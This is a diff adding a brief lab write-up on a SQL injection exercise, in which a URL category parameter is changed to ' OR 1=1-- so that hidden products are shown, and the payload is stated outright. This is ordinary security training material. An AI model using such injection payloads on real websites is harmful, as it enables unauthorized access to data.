@@ -1,0 +1,5 @@
+Lab 1: SQL injection vulnerability in WHERE clause
+1) Opened the "Gifts" category
+2) In the URL, replaced `category=Gifts` with `category=Gifts' OR 1=1--`
+3) The site displayed all products (including hidden ones)
+Payload: ' OR 1=1--
